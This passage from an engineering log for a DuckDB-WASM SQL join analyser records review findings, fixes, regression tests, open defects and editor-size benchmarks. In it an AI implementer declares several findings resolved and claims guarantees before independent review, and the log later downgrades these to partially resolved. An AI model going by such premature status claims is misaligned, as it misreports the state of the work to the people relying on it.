| `WHERE`/`GROUP BY`/`HAVING`/`ORDER BY`/`LIMIT` | unsupported | ✔ count-only probes; outer-join/`WHERE` classification |
| Aggregate inflation attribution | not checked | not checked |
| Automatic SQL rewrites or advice | never | never |
| Subqueries, set operations, windows, `DISTINCT`, `QUALIFY`, `ROLLUP`, recursive CTEs, comma/CROSS/NATURAL/SEMI/ANTI/ASOF joins, table functions, `COLLATE` | unsupported | unsupported |

### 12.13 Unresolved release blockers [Superseded: §13.15]

1. **Collation detection:** text keys are validated empirically but not detected. They stay outside MVP scope until collation is proven detectable, or text keys are qualified separately.
2. **Memory:** the application budgets are not a hard guarantee against WASM or browser memory exhaustion (§12.3). The browser-ceiling behaviour is untested.
3. **Scale:** the analyser has not been run on file-backed datasets at the P-024 ceiling (50 MB), nor in Safari or Firefox.
4. **Parser format:** DuckDB's serialised-SQL JSON is internal. The MVP allowlist refuses unknown fields, so an engine upgrade fails safely to `unsupported`, but it must be re-qualified.
5. **Real-world coverage:** how much real analyst SQL fits the MVP shape is unmeasured. The scope is deliberately narrow.
6. **Maintainer decisions:** P-026 (categories, now eight) and P-031 to P-034 are provisional.
7. **No independent re-review yet:** Codex should verify these corrections.

## 13. Second Codex review of the analysis engine (Phase 4 hardening) — resolution, 2026-11-25

> **Corrected after independent review (Step 4.4.4, 2026-11-26):** the statuses and several guarantees below were claimed by the implementer before Codex re-verified them. The corrected statuses, the evidence Codex reproduced, and five outstanding defects (QV-SA-001 to QV-SA-005) are recorded in §14 and in [SQL_ANALYSIS_FINDINGS.md](SQL_ANALYSIS_FINDINGS.md). Where a statement in §13 conflicts with §14, §14 is correct.

Codex independently verified 32 join scenarios against DuckDB (62 Vitest, 9 Python and 22 selected Chrome tests passed) but returned **NO-GO for public release**: two high-severity and three medium-severity findings. This cycle resolves them without expanding the diagnostic scope (§13.14). Spike code on `spike/sql-analysis`; harness-only, absent from the production `dist/`; Chrome 158 on the Apple M2 MacBook Air (8 GB).

### 13.1 Status

| Finding | Status |
|---|---|
| H-A Snapshot consistency and exclusive analysis ownership | ~~RESOLVED~~ **PARTIALLY RESOLVED** (§14: QV-SA-002, QV-SA-005) |
| H-B Execution budgets and guaranteed terminal outcomes | ~~RESOLVED for application-level bounds~~ **PARTIALLY RESOLVED** (§14: QV-SA-001, QV-SA-003, QV-SA-005); no hard browser-memory guarantee (§13.10) |
| M4 Non-finite metric comparisons | **RESOLVED within the tested scope** (finite-tolerance precision: QV-SA-004) |
| M5 Quoted identifier handling | **RESOLVED within the tested scope** |
| M6 Missing expectation outcomes | **RESOLVED for count and identity**; stale-publication limitation remains (QV-SA-002) |

### 13.2 H-A: snapshot consistency and exclusive ownership — RESOLVED

**Root cause.** Each diagnostic was a separate `session.run()` call. Any other queued operation could run between two of them, so frequencies, validation counts and witnesses could come from different data. The Codex reproduction changed the left key after the left frequency table was built: every *count* still agreed, but the witness (key 1) no longer existed. Views were accepted as inputs, so a `nextval()` view was re-evaluated on every scan.

**DuckDB semantics, verified in the browser** (DuckDB-WASM 1.33.1-dev57.0 / DuckDB v1.5.4, single connection, Chrome 158; probe statements run through `EngineSession`):

| Behaviour | Observed |
|---|---|
| `CREATE TEMP TABLE` inside `BEGIN … ROLLBACK` | rolled back with the transaction |
| execution error inside a transaction (`'abc'::INTEGER`) | transaction **aborted**; every later statement fails until `ROLLBACK` |
| binder error inside a transaction | transaction not aborted |
| `BEGIN` while a transaction is open | error (`cannot start a transaction within a transaction`) |
| `json_serialize_sql`, `DESCRIBE` inside a transaction | work |
| `GENERATED ALWAYS AS (nextval(…))` / `(random())` columns | accepted by DuckDB; visible only in `duckdb_tables().sql` |
| `ATTACH ':memory:'`, `USE`, `SET search_path` under the lockdown | allowed: name resolution can change |
| `DISTINCT k … LIMIT 2` plan | `HASH_GROUP_BY` below `STREAMING_LIMIT` (full grouping; see H-B) |

A transaction alone gives a stable snapshot only of DuckDB-managed tables. It says nothing about file-backed views (each scan re-reads the file) or volatile expressions (re-evaluated per scan). So stability is established by four layers, not by the transaction alone:

1. **Exclusive ownership.** `EngineSession.exclusive(fn)` occupies one slot of the session's FIFO queue for the whole analysis. User SQL, file registration, removal, re-import and other analyses queue behind it. Ownership is released when `fn` settles, on every path (success, failure, cancel, deadline, replacement). The connection is private to the session, so the queue is the only path to the engine.
2. **One transaction, always rolled back.** `analyzeInSession` runs `BEGIN TRANSACTION`, every diagnostic, then `ROLLBACK` (bounded; a failed or stalled rollback invalidates the session). The analyser's temporary tables go with the rollback. If a user transaction is already open, the analysis refuses (`inconclusive`, `transaction-unavailable`); it never rolls back a transaction it does not own.
3. **Verified stable relations (MVP).** Each input name is looked up in `duckdb_tables()` and `duckdb_views()` across every attached database and schema. It must match exactly **one** catalog object, which must be a base table in the current database and schema (or a temporary table) without generated columns. Views (including file-backed views from "attach as view"), replacement scans, table functions, CTEs, ambiguous names and generated columns are refused with `unsupported-relation`. Imported datasets ("attach as table") and tables created by SQL qualify. Table OIDs are recorded and re-checked at the end.
4. **Detection inside the batch (defence in depth).**
   - *Key-multiset fingerprint* (rows, NULL-key rows, `sum(hash(keys))`, `bit_xor(hash(keys))`) of each join side at the start, compared at the end. A change withdraws **every** join statistic: status `inconclusive`, `snapshot-inconsistent`, all dependent expectations `unchecked`.
   - *Witness identity:* every sampled key (fan-out, unmatched left, unmatched right; at most 15) is re-counted on both inputs and through the query's own join node, and must produce exactly the rows the frequency tables claim. Otherwise `witness-mismatch` and the join is withdrawn.
   - *Generation binding:* a batch is bound to one engine generation. After recovery, replacement or disposal its statements return `stale`; a stale result ends the analysis (`session-replaced`) and is never authoritative.

**Regression tests** (`tests/e2e/analysis-hardening.spec.ts`):
- Codex reproduction: an `UPDATE` issued after the left frequency table exists runs only after the analysis returns (event log: `busy analysis` then `busy query`). The report is authoritative and describes one snapshot (witness key 1, counts 1 × 2). After the update the join returns (2, 2) and a new analysis reports witness key 2.
- Interference that bypasses the queue (a write through the analysis batch itself, simulating a defect): after the left frequencies, counts still agree (`semiJoin`/`executedCount` agreed) but `witness-mismatch` withdraws the join. Just before the final fingerprint, `snapshot-inconsistent` withdraws everything.
- Concurrent dataset removal and replacement (`dropFile`, `registerFile` of the same name) run after the analysis; the report describes the original data.
- Simultaneous analyses are serialised; each is authoritative and coherent with the data at its turn (2 rows, then 5).
- Volatile `nextval()` view, plain view and a table with a volatile generated column: refused in MVP scope. In experimental scope the volatile view is detected as inconsistent and never authoritative.
- Ambiguous name (temporary table shadowing a table), tables in an attached database after `USE`, and file-backed views.
- Cancellation between and during statements, session replacement while running and while queued, disposal while running.

### 13.3 H-B: execution budgets and guaranteed terminal outcomes — [Corrected: PARTIALLY RESOLVED, §14]

> **Correction (§14):**
> - Witness verification runs join re-counts outside the execution-budget gate (QV-SA-001).
> - A worker recovery whose dataset reattachment stalls can leave later SQL pending (QV-SA-003).
> - A batch callback that never settles keeps the FIFO lease, so later operations stay queued, although `analyzeInSession` itself returns (QV-SA-005).
>
> The bounds below therefore apply to the caller of `analyzeInSession`, not to the liveness of the session as a whole.

**Root cause.**
- The "distinct-key budget" ran `SELECT DISTINCT … LIMIT n+1`. DuckDB plans the full `HASH_GROUP_BY` below the limit, so the check itself did the grouping it claimed to bound.
- The executor awaited `session.cancel()` and then the running statement without a bound. A stalled RPC with an ineffective cancel left the caller waiting forever: the Codex stand-in was still pending after 80 ms with a 5 ms deadline.

**Correction: output limits and work limits are separated.**
- The `DISTINCT … LIMIT` pre-check and the `maxDistinctKeys` option are **removed**. Distinct counts are still reported, as statistics.
- Before any grouping runs, each join is qualified on separate limits, and every quantity is reported in `report.resources`:
  - input rows: a bounded `LIMIT maxInputRows + 1` scan, 50 M by default. For base tables the scan stops early; for views it bounds rows returned, not the work to produce them.
  - number of key columns: at most 8.
  - fixed key width: from the integer types (1–16 bytes).
  - estimated grouping state per side: rows × (key bytes + 16-byte count + 64 bytes assumed per-group overhead), at most 512 MiB by default. This is an upper-bound estimate, not a measurement.
  - DuckDB `memory_limit` in effect: the engine-enforced control.
  - number of diagnostic statements.

**Correction: terminal outcomes are bounded** (`executor.ts`, `analyzeInSession`, `EngineSession`).
- **Deadline and cancellation:** one analysis-wide deadline, which also covers the wait for exclusive ownership. On expiry, only the batch's own active statement is cancelled. The cancel request gets `cancelGraceMs` (2 s by default); the statement then gets `cancelGraceMs` to settle. A cancel that is rejected, hangs, or returns without stopping execution leads to **worker termination** (`invalidate`): the worker is terminated synchronously and recovery runs in the background. The caller never waits on the worker.
- **No late results:** after any terminal event the executor is dead. Late responses are ignored and every later statement is refused, so a timed-out statement can never contribute evidence.
- **Bounded cleanup:** cleanup statements (`DROP`, `ROLLBACK`) are bounded by `cleanupMs` (5 s by default). They still run after a cancel, but only on the same engine. A cleanup that fails or stalls invalidates the session, because it could otherwise remain inside the analysis transaction.
- **Batch-wide cancel:** `session.cancel()` during an exclusive batch cancels the whole batch, including between statements, where there is no active statement to interrupt.
- **Bounded boots:** startup and recovery boots are bounded by `bootTimeoutMs` (30 s by default). A recovery that fails or times out leaves the session `failed`: no SQL until `start()` succeeds again. Recovery boots through the same fail-closed path as startup, so the lockdown is applied and verified again before SQL is accepted.
- **Worst-case return time** for `analyzeInSession`: deadline + 2 × `cancelGraceMs` + `cleanupMs` + 1 s, which is 40 s with the defaults. If even that outer bound is reached (the batch hangs outside any statement), the worker is invalidated and `budget-exhausted` is returned.

**Regression tests.**
- **Stand-ins** (`tests/unit/analysis-executor.test.ts`, each with an asserted wall-time bound): stalled RPC with ineffective cancel (the Codex repro, now returning in under 85 ms with a 5 ms deadline and a 20 ms grace); cancel rejection; cancel that never returns; cooperative cancel; late response ignored and nothing run afterwards; stale engine; cancelled statement; truncated and wrongly shaped results; rejected RPC; stalled cleanup; cleanup after cancel; stalled queue (`queue-wait`); stalled worker during the batch; a batch hanging outside any statement (outer bound); an open user transaction; an unavailable session.
- **Real browser:** a deadline over a swapped-in 30 M-value streaming aggregate (memory-light; replaces the retired 400 M-row view test), which is cancelled, rolled back and leaves the session `ready`. Invalidation with successful recovery: generation 2, lockdown re-verified, `SET enable_external_access = true` refused. Invalidation whose recovery fails its lockdown: state `failed`, SQL refused, the next analysis returns `session-unavailable`. The grouping-state budget refuses before any `GROUP BY` or `DISTINCT` runs.

### 13.4 M4: non-finite metric comparisons — RESOLVED

- **Root cause:** with a source total of `inf`, both `abs(j − s)` and the tolerance bound became `inf`, and `inf <= inf` reported `held`.
- **Correction:**
  - The comparison query also returns whether both totals are finite, and whether the difference and the tolerance bound are finite.
  - Any non-finite value makes the expectation `unchecked`, with the totals as evidence. Non-finite values are not supported by any specification.
  - Tolerance must be a finite number ≥ 0 and `nullAsZero` a boolean; otherwise the expectation is reported as invalid.
  - NULL-versus-zero semantics (§12.4) and the exact comparison at tolerance 0 are unchanged.
  - Metric preservation remains experimental and never authoritative.
- **Tests:**
  - +inf, −inf and NaN at tolerances 0.01, 0 and 1, including the Codex repro (`inf` vs `1.0`);
  - inf vs inf;
  - finite totals whose bound overflows;
  - finite comparisons still `held`;
  - four invalid tolerances;
  - the existing H1/H4 exact `DECIMAL`/`HUGEINT` and NULL tests still pass.

### 13.5 M5: quoted identifier handling — RESOLVED

- **Root cause:** the outer-join probe rebuilt its marker column from the display string `r.k.x` with `split('.')`, so `r."k.x"` became three parts and the optional probe failed. That failure discarded the whole report as `diagnostic-failed`.
- **Correction:**
  - Join keys are kept as structured (relation, column) pairs and turned into SQL only through DuckDB's serialiser.
  - User-supplied column references are parsed with SQL quoting rules (`parseColumnRef`: quoted dots, `""` escapes).
  - Displayed keys are quoted when needed.
  - Optional experimental probes (WHERE count, final count, outer-join check, grain and metric expectations) fail independently as `optional-check-failed` (`inconclusive`). Validated join evidence is kept, and the report is `partially-analyzed` and never authoritative.
  - Because an execution error aborts the transaction, later optional checks are skipped and listed as not checked.
- **Tests:** the Codex repro (`r."k.x"` LEFT JOIN with a filtering probe: statistics kept, finding counts match DuckDB); composite keys with spaces and escaped quotes; aliases with spaces; a reserved word (`"select"`) as a `USING` key; an injected probe failure that keeps identical statistics.

### 13.6 M6: missing expectation outcomes — [Corrected: RESOLVED for count and identity, §14]

> **Correction (§14):** every report carries exactly one outcome per expectation, with index and identity. A report finalised before a late cancellation or engine replacement can still be published with outcomes that are stale (QV-SA-002).

- **Root cause:** early exits (unsupported, query failure, budget, diagnostic failure) built reports with `expectations: []`. The §12.4 statement "every expectation gets exactly one outcome" held only on the main path.
- **Correction:** every report, on every path, is finalised through one function that returns exactly one outcome per declared expectation, in order.
  - Each outcome carries `index` and the declared expectation object unchanged.
  - Anything not evaluated is `unchecked`, with the reason of the path that ended the analysis.
  - Malformed expectations are reported as `invalid expectation: …` on every path. Examples: an unknown kind, a non-integer join, a missing side, empty grain columns, `min > max`, an invalid tolerance.
  - Every `unchecked` outcome also appears as an `expectation-unchecked` finding. An unchecked expectation is never interpreted as held.
- **Tests:** eleven paths (syntax error, non-SELECT, unsupported construct, bind failure, view refused, non-integer key, input budget, deadline, diagnostic failure, open transaction, analysed), each with five expectations including two invalid ones: indices, identity and reasons are asserted. Stand-ins cover queue wait, outer bound and an unavailable session. The MVP sweep checks one unchecked outcome per expectation on all 167 refused fixture cases.

### 13.7 Session ownership and lifecycle

| Event during an analysis | What happens | Report |
|---|---|---|
| user SQL, import, removal, re-import, another analysis | queued behind the analysis (FIFO) | unaffected |
| `session.cancel()` | whole batch cancelled; running statement cancelled cooperatively, else worker terminated | `cancelled`, not authoritative |
| deadline | batch statement cancelled; bounded grace; else worker terminated | `budget-exhausted` with `terminal` |
| `restart()` / recovery / `invalidate` | engine generation changes; remaining statements are `stale` | `diagnostic-failed` / `session-replaced` |
| `dispose()` | engine gone; remaining statements are `stale` | `diagnostic-failed`, never hangs |
| recovery fails | session `failed`, no SQL | later analyses: `session-unavailable` |

Ownership is released when the batch function settles, on every path. Recovery loses in-memory tables: imported tables are marked `needs-reimport`, and tables created by SQL are lost (existing spike behaviour).

### 13.8 Supported relation types

| Relation | MVP (authoritative) | Experimental |
|---|---|---|
| Base table in the current database and schema (created by SQL or imported via "attach as table") | ✔ | ✔ |
| Temporary table | ✔ | ✔ |
| Table with generated columns | refused | analysed, not authoritative |
| View (including file-backed "attach as view") | refused | analysed, not authoritative; volatility detected by fingerprint and witnesses, not prevented |
| CTE | refused | ✔ non-recursive |
| Replacement scan, file path, table function | refused | refused (`unsupported`) |
| Name matching several catalog objects | refused | analysed, not authoritative |
| Table in another schema or database | refused | analysed, not authoritative |

### 13.9 Execution and cleanup deadlines

| Bound | Default | Enforced by |
|---|---|---|
| Analysis deadline (including queue wait) | 30 s | executor, `analyzeInSession` |
| Cancel request, then statement settle | 2 s each | executor (then worker termination) |
| Session cooperative cancel | `cancelDeadlineMs` (2 s in tests) | `EngineSession` |
| Cleanup statement (`DROP`, `ROLLBACK`) | 5 s | executor (then invalidation) |
| Whole `analyzeInSession` call | deadline + 2 × grace + cleanup + 1 s | `analyzeInSession` (then invalidation) |
| Engine boot (start, recovery) | 30 s | `EngineSession` (then `failed`) |

### 13.10 Resource-budget limitations

- **Not guarantees:**
  - the grouping-state estimate is an upper-bound heuristic, not a measurement of DuckDB's allocator;
  - the input bound limits rows, not the work behind a view;
  - none of these is a guarantee against browser or WASM memory exhaustion.
- **Engine control:** DuckDB's `memory_limit` is the engine-enforced control (reported in each report).
- **What can still happen:**
  - a single operator can allocate before the deadline fires;
  - the browser tab can still be killed by the operating system above the engine limit.
- **Not tested:** the browser ceiling. The 400 M-row view and the 10^8-row tests were **not rerun** (maintainer instruction).

### 13.11 Authoritative versus non-authoritative reports

A report is `authoritative` only when `nonAuthoritativeReasons` is empty, which requires all of the following:
- MVP scope;
- status `analyzed`, with no inconclusive finding and no unchecked expectation;
- every diagnostic ran in one exclusive transactional batch on the current engine generation;
- every relation is a verified stable table (§13.8);
- every join has validated statistics (invariants, `SEMI JOIN`, executed count within budget), verified witnesses and a verified snapshot;
- `ROLLBACK` succeeded;
- the engine was not replaced before the report was returned. **[Not fully enforced: QV-SA-002. Cancellation or replacement after the last statement and before publication is not detected.]**

Every other report lists its reasons. Experimental reports are never authoritative. `analyze(executor, …)` without the session batch (stand-ins, tests) is never authoritative.

### 13.12 Verification results (actual, 2026-11-25) — implementer's own runs

> These are Claude Code's own results; the independent Codex results are in §14.2. The full 79-test browser run has not been independently reproduced.

| Check | Result |
|---|---|
| Type check | pass |
| Vitest | **80 passed** (62 earlier, plus 18 new: executor stand-ins, `analyzeInSession` stand-ins, identifier parsing, expectation validation) |
| Python unittest | **9 passed** |
| Playwright, Chrome 158 | **79 passed**: all earlier suites (lifecycle, security, bounded results, benchmark guard, spike UI, 237-case oracle sweep, MVP sweep, 17 Step 4.4 regression tests), plus 12 new hardening tests |
| MVP sweep | 70 eligible cases authoritative and matching the oracle; 167 cases and 21 constructs refused, each refusal with one `unchecked` outcome per expectation |
| Mutation checks (new) | 10 of 10 caught: exclusive ownership removed; witness verification removed; end fingerprint ignored; views accepted; batch-wide cancel removed; both non-finite checks removed; identifier split from text; early-exit outcomes dropped; executor awaiting a stalled RPC; outer bound removed. (Removing only the totals check is still caught by the difference/bound check: defence in depth.) |
| Production build | succeeds; contains no analysis or harness code |

**Changed tests (not weakened):**
- The distinct-key budget test became a grouping-state test that asserts that no `GROUP BY` or `DISTINCT` statement ran.
- The 400 M-row deadline test became a 30 M-value memory-light fixture.
- The MVP sweep's refusal check now also requires exactly one `unchecked` outcome per expectation.

**Measured cost** (Chrome 158, M2, in-memory tables; LEFT JOIN of `n` orders to `n/10 + 1000` customers, `BIGINT` keys; 3 runs, warm runs shown). This table shape differs from §12.9, so the two are not directly comparable.

| Orders | MVP analysis (40 statements) | Experimental (41) | Plain `count(*)` of the join |
|---:|---:|---:|---:|
| 1,000,000 | 138–139 ms (236 ms cold) | 150–159 ms | 12–13 ms |
| 5,000,000 | 588–611 ms | 659–696 ms | 67–68 ms |

### 13.13 Diagnostic execution architecture (current)

`analyzeInSession` → `EngineSession.exclusive` → `BEGIN` → parse and recognise → bind → classify relations → resource qualification (no grouping) → per join: start fingerprint and totals, two temporary frequency tables, statistics, invariants, `SEMI JOIN`, executed count, witnesses, witness verification → end fingerprints and table identities → (experimental) optional probes → expectations → `ROLLBACK`.

Each base relation is scanned about 7 times: input check, start fingerprint, grouping, `SEMI JOIN`, executed count, end fingerprint, plus witness re-counts pushed down to single keys.

### 13.14 Diagnostic support matrix (scope frozen)

| Capability | MVP (authoritative) | Experimental (never authoritative) |
|---|---|---|
| Inputs | exactly two verified stable tables (§13.8) | named tables, views, CTEs |
| One INNER or LEFT JOIN on AND-ed equalities | ✔ same-type integer keys, single or composite | ✔ any same type, validated |
| Duplicate and NULL keys, matched/unmatched rows, output cardinality, excess copies, relationship | ✔ validated, snapshot-consistent | ✔ validated |
| Bounded witnesses (≤ 5 per kind) | ✔ identity-verified (verification currently bypasses the execution budget: QV-SA-001) | ✔ identity-verified (same defect) |
| Expectations: relationship, no-row-loss, no-fan-out, row-count | ✔ | ✔ |
| Expectations: grain, metric-preserved | unchecked | ✔ executed, budget-gated, non-finite refused |
| RIGHT/FULL, join chains, CTEs, nested queries, `WHERE`/`GROUP BY`/`ORDER BY`/`LIMIT` | unsupported | ✔ (count-only probes; optional checks fail independently) |
| Collated or coerced keys | unsupported | type mismatch refused; collation caught by validation only |
| Post-join filter attribution | unsupported | ✔ outer-join/`WHERE` classification |
| Aggregate inflation attribution, automatic SQL rewrites | never | never |

These restrictions apply to Verdict diagnostics only, not to ordinary SQL execution in the workspace.

### 13.15 Unresolved release-qualification requirements [Superseded: §14 and SQL_ANALYSIS_FINDINGS.md §8]

1. **Independent re-review:** Codex re-verification of §13.
2. **Memory:** no hard browser or WASM memory guarantee (§13.10); browser-ceiling behaviour untested.
3. **Scale and browsers:** no run on file-backed datasets at the P-024 ceiling, nor in Safari or Firefox.
4. **Text keys:** collation is still not detectable, so text keys stay outside MVP scope (§12.13 item 1).
5. **Engine upgrades:** the parser JSON format, catalog functions (`duckdb_tables().sql` for generated columns) and transaction semantics (§13.2 table) are engine-internal and must be re-qualified on any engine upgrade. The behaviour table is a candidate for an automated check.
6. **Fingerprint strength:** the key-multiset fingerprint is a 64-bit hash sum and XOR, not cryptographic. It is the third layer, behind exclusive ownership and the transaction, not the guarantee.
7. **Real-world coverage:** how much analyst SQL fits the MVP shape is unmeasured.
8. **Recovery data loss:** recovery loses tables created by SQL; product behaviour is not yet specified.
9. **Maintainer decisions:** P-026 and P-031 to P-038 are provisional.

## 14. Experimental checkpoint after independent review (Step 4.4.4), 2026-11-26

**Phase 4 (experimental research): conditionally complete**, subject to an independent review of this checkpoint's documentation.

- **Handoff document:** [SQL_ANALYSIS_FINDINGS.md](SQL_ANALYSIS_FINDINGS.md) is the canonical source for the defect register, the proposed MVP boundary, production architecture requirements, acceptance criteria, release gates, sequencing and the reuse assessment. This section records only the checkpoint.

### 14.1 Codex verdicts

| Question | Verdict |
|---|---|
| Experimental implementation | CONDITIONAL GO for isolated research |
| Commit readiness | NO until documentation claims are corrected (this checkpoint) |
| Phase 5 readiness | YES WITH CONDITIONS |
| Public release readiness | NOT READY |

The analyser is not production-ready, and no production code depends on it.

### 14.2 Evidence: independent (Codex) versus implementer (Claude Code)

| | Codex, independent (Step 4.4.4) | Claude Code, own runs (§13.12) |
|---|---|---|
| Type check | passed | passed |
| Builds (production, harness) | both passed | both passed |
| Vitest | 80 passed | 80 passed |
| Python unittest | 9 passed | 9 passed |
| Chrome (Playwright) | **59 selected** tests passed; full suite not run | 79 passed (full suite, one run) |
| DuckDB comparisons | 72 independent comparisons; no output-cardinality or matched-row discrepancies | 237-case oracle sweep; 70-case MVP sweep |
| Production artifact | analyser and harness excluded | analyser and harness excluded |
| Security and network | selected security tests passed; no external requests in the independent Chrome matrix | security suite passed as part of the 79-test run |
| Mutation checks | not reported | 10 of 10 caught |

**Unverified by anyone:**
- Safari and Firefox;
- an actual GitHub Pages deployment;
- background-tab timer throttling;
- production-scale memory behaviour, including the WASM ceiling;
- the analyser on file datasets at the P-024 ceiling.

The 400 M-row and 10^8-row experiments were retired, not rerun.

### 14.3 Corrected statuses of the second-review findings

| Finding | Status |
|---|---|
| H-A Snapshot consistency | PARTIALLY RESOLVED |
| H-B Execution safeguards | PARTIALLY RESOLVED |
| M4 Non-finite metric comparisons | RESOLVED within the tested scope |
| M5 Quoted identifier handling | RESOLVED within the tested scope |
| M6 Expectation outcome completeness | RESOLVED for count and identity; stale-publication limitation remains |

### 14.4 Outstanding defects

Full reproduction, correction and acceptance criteria are in [SQL_ANALYSIS_FINDINGS.md §5](SQL_ANALYSIS_FINDINGS.md).

| ID | Severity | Defect | Gate |
|---|---|---|---|
| QV-SA-001 | HIGH | Witness verification bypasses the join execution budget (3 × 4 join: 12 rows materialised with a budget of 1) | blocks enabling the public Verdict analyser |
| QV-SA-002 | HIGH | Authoritative report can survive cancellation or engine replacement before publication | blocks enabling the public Verdict analyser |
| QV-SA-003 | MEDIUM | Stalled dataset reattachment during worker recovery can leave later SQL pending | blocks production engine qualification |
| QV-SA-004 | MEDIUM | Experimental metric tolerance comparison loses exact precision (DOUBLE conversion) | metric preservation stays excluded from the public MVP |
| QV-SA-005 | MEDIUM | A stalled batch (harness) callback retains the FIFO session lease | blocks production engine qualification |

### 14.5 Proposed public MVP boundary

- **In scope:** two stable DuckDB-managed tables; one INNER or LEFT JOIN on explicit same-type integer key equalities, single or composite.
- **Measured:** join cardinality; duplicate and NULL key counts; matched and unmatched input rows; excess copies; relationship classification; bounded, snapshot-consistent witnesses; explicit, fully checked join-stage expectations.
- **Outside the qualified public diagnostic scope:** file-backed and arbitrary views, CTEs, join chains, collated or coerced keys, advanced filter attribution and metric preservation.
- **Diagnostics only:** these restrictions apply to Verdict diagnostics, not ordinary SQL execution.
- **Implications of requiring DuckDB-managed tables** ([SQL_ANALYSIS_FINDINGS.md §6.1](SQL_ANALYSIS_FINDINGS.md)):
  - import memory overhead inside the WASM heap;
  - the P-024 ceiling must be re-measured as import plus analysis;
  - total loss of in-memory tables on worker termination, which requires re-import and invalidates every report from the old generation.

### 14.6 Repository hygiene for this checkpoint

- Ignored and not proposed for commit: generated datasets (`data/`), raw benchmark output (`results/raw/`), builds (`dist/`, `dist-harness/`), vendored engine extensions (`public/`), caches and test output.
- No binaries (`.wasm`, extensions, data files) are tracked or proposed.
- `tests/fixtures/analysis/cases.json` (391 KB) is a deterministic synthetic fixture (seed 20261125), regenerated by `scripts/make_analysis_fixtures.py`.
- No credentials or private files were found in the proposed changes.
- **Redistribution:** third-party notice obligations for DuckDB-WASM, DuckDB, its bundled components and Arrow remain unresolved (§10.12). The proposed commits contain source and documentation only, so they redistribute none of those artifacts. No build artifact may be published until the notices are resolved.

## 15. E9 editor qualification (M05, 2026-11-27): PARTIALLY VERIFIED

Run by Claude Code at the start of M05 (IMPLEMENTATION_PLAN M05 field 6; AM-013; ARCHITECTURE §24 V11, V12). The timing method was revised after the Codex M05 review and re-run; the results below are from that run. Harness, exact versions (`package.json` and its `package-lock.json`) and raw results: [docs/evidence/e9-editor/](evidence/e9-editor/). Monaco was installed only in that isolated harness, never in the application.

**Status: partially verified.**
- Measured: bundle cost, requests, CSP, keyboard behaviour, typing and paste timing, and Chromium IME and forced-colours emulation. The candidate choice rests on these.
- Not done: manual screen-reader editing (VoiceOver, NVDA), IME with a real input method, and Windows High Contrast (§15.3).

### 15.1 Method

- **Machine:** Apple M2 MacBook Air, 8 GB RAM, macOS (Darwin 25.5). Node 24.2.0.
- **Browsers:** Google Chrome 158.0.8127.37 (installed), Playwright Firefox 159.0 and WebKit 27.2; Playwright 1.65.1, headless. No other browser tests ran during the measurement.
- **Build:** the production Vite configuration reproduced: Vite 8.3.8, `@vitejs/plugin-react` 6.3.0, `base: '/queryverdict/'`, the production meta CSP (`scripts/csp.mjs`), `target: es2022`, `assetsInlineLimit: 0`, no source maps. Each page was served by `vite preview` under the subpath.
- **Pages:** three React 19.3.1 pages with the same 1,000-line SQL document (joins, comments, strings, numbers; about 43 KB) between two buttons. Each exposes the same probe: read the text, read the caret offset, and put the caret at the end through the editor's own API.
  - `baseline`: a plain `<textarea>`;
  - `cm`: CodeMirror 6 with line numbers, history, default and history keymaps, drawn selection, active-line highlight, `lang-sql` (PostgreSQL dialect) and the default highlight style;
  - `monaco`: Monaco 0.58.0's minimal ESM API, the SQL language, its editor worker (bundled by Vite as a same-origin worker) and the contributions needed for parity (clipboard, Tab-focus toggle, comment toggling, icon CSS).
  - `monaco-full` (Monaco's default entry) was built for size only.
- **Sizes:** every emitted file, raw, gzip level 9 and brotli quality 11 (`sizes.mjs`). Incremental cost is the difference from the baseline page.
- **Per trial (`measure.mjs`):** 7 trials per page and browser, each in a fresh browser context with the identical document.
  1. **Ready time:** `performance.now()` two animation frames after the editor was created.
  2. **Requests and CSP:** every request is recorded and checked against the page origin; violations are collected through `securitypolicyviolation`.
  3. **Typing:** the caret is put at the document end and its offset asserted. Then 60 keystrokes, with latency measured from keydown to the second animation frame. The resulting text is asserted to be exactly document plus typed text.
  4. **Paste:** one real clipboard paste of 204,800 characters (`navigator.clipboard.writeText`, then Cmd+V) at the asserted document end. It is timed to the second frame after the text arrives, and the length and suffix are validated.
- **Once per candidate, in a separate context:**
  - **Keyboard:** Tab from the button before the editor, Tab again, Shift+Tab from the button after. WebKit used Option+Tab. For a captured Tab, the documented escape was tried: Monaco Ctrl+Shift+M, then Tab.
  - **axe-core 4.14.1** with default rules. The landmark and heading findings belong to the bare test page.
- **IME:** Chromium only, through the DevTools protocol (`Input.imeSetComposition`, then `Input.insertText`), in the first run and in the application tests.
- **Forced colours:** Chromium emulation, screenshot inspection.
- **Corrections to the first run (Codex M05 review):**
  - The first run typed at a caret position that was never verified.
  - It also ran a synthetic paste before the timed paste, so in Firefox the textarea held about 248,000 characters against the editors' 43,000.
  - Its typing and paste figures are superseded and no longer reported.
  - Earlier exploratory methods were also dropped: `document.execCommand('insertText')` took 27–29 s even for the textarea, and synthetic paste events, whose clipboard data Firefox ignores.
- **Measurement boundary:**
  - The timings are single-machine, headless, and two frames from input.
  - They are not input-to-photon latency.
  - They are not memory use, which was not measured.

### 15.2 Results (observed)

**Shipped assets (emitted by the production build of each page):**

| Page | Files | Raw bytes | Gzip | Brotli | Incremental over baseline (raw / gzip / brotli) |
|---|---|---|---|---|---|
| baseline (textarea) | 2 | 220,859 | 68,375 | 58,891 | — |
| CodeMirror 6 | 2 (one JS chunk) | 556,243 | 176,592 | 151,638 | **335,384 / 108,217 / 92,747** |
| Monaco (minimal + parity) | 7 (JS 3.15 MB, worker 342 KB, CSS 121 KB, icon font 155 KB) | 3,768,352 | 1,002,205 | 804,643 | **3,547,493 / 933,830 / 745,752** |
| Monaco default entry (size only) | 96 | 14,220,889 | 3,370,077 | 2,530,476 | 14,000,030 / 3,301,702 / 2,471,585 |

**Fetched at startup and during ordinary editing (all 7 trials, all browsers):**
- CodeMirror: the page and its one JS chunk.
- Monaco: the page, its JS, its CSS and the lazily loaded SQL language chunk.
- Monaco's worker and icon font are emitted but were **not** fetched: no step used a feature that needs them.
- Codex separately confirmed that invoking the worker factory loads the worker from `/queryverdict/` under the existing CSP.

**Ready time (median of 7, ms):**

| | Chrome 158 | Firefox 159 | WebKit 27.2 |
|---|---|---|---|
| baseline | 47.2 | 53 | 43 |
| CodeMirror 6 | 77.3 | 92 | 75 |
| Monaco | 210.8 | 325 | 222 |

**Typing latency (keydown to second frame; 420 keystrokes = 7 trials × 60; median / p95 ms):**

| | Chrome | Firefox | WebKit |
|---|---|---|---|
| baseline | 25 / 32 | 16 / 31 | 24 / 32 |
